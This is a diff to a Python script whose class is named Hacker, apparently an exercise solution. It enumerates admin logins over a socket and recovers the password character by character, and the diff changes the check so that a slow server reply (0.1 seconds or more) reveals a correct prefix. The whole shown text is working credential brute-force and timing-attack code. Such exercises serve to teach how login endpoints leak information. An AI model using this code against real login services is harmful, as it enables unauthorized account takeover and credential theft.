@@ -3,6 +3,7 @@ import socket
 import sys
 import itertools
 import json
+from datetime import datetime, timedelta
 
 
 class Hacker(object):
@@ -31,22 +32,23 @@ class Hacker(object):
                 while not got_login:
                     admin = admins.readline().rstrip('\n')
                     credentials = {"login": admin, "password": ' '}
+
                     self.client_socket.send(json.dumps(credentials).encode(encoding='UTF8'))
                     response = self.client_socket.recv(1024)
                     response = response.decode(encoding='UTF8')
                     response = json.loads(response)
-                    # print(response['result'])
                     if response['result'] == 'Wrong password!':
                         got_login = True
                 pass_trial = incomplete_pass + next(keys)
-                
+
                 credentials = {"login": admin, "password": pass_trial}
+                starting = datetime.now()
                 self.client_socket.send(json.dumps(credentials).encode(encoding='UTF8'))
                 response = self.client_socket.recv(1024)
+                finish = datetime.now()
                 response = response.decode(encoding='UTF8')
                 response = json.loads(response)
-
-                if response['result'] == 'Exception happened during login':
+                if finish - starting >= timedelta(seconds=0.1):
                     incomplete_pass = pass_trial
                 elif response['result'] == "Connection success!":
                     credentials = {"login": admin, "password": pass_trial}
